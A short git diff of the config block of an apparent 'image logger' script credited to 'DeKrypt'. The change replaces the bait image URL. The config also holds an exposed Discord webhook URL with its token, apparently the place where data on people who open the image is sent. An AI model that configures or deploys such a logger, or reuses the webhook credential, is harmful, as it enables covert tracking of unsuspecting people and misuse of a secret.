@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1339017775930151023/JcFPOpK74oaRdWYQmJ2l3UMwFJ_b4Ge2eWUnQdZs7X-whAd_9H_K1acUg0WxadYXExxh",
-    "image": "https://th.bing.com/th/id/R.0d82d65ddbb177727ef8f2e8001b94dd?rik=Mt6uC1fbYPJXxg&riu=http%3a%2f%2fupload.wikimedia.org%2fwikipedia%2fcommons%2f3%2f3a%2fBliss_in_Russia.jpg&ehk=7E9TURbAuk6JvrL5n1b%2fJ4LPop0aETwtmKo%2bBa%2fVpAc%3d&risl=&pid=ImgRaw&r=0", # You can also have a custom image by using a URL argument
+    "image": "https://static.wikitide.net/greatcharacterswiki/f/f9/Xfgfjbvdhbvjhsdb.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
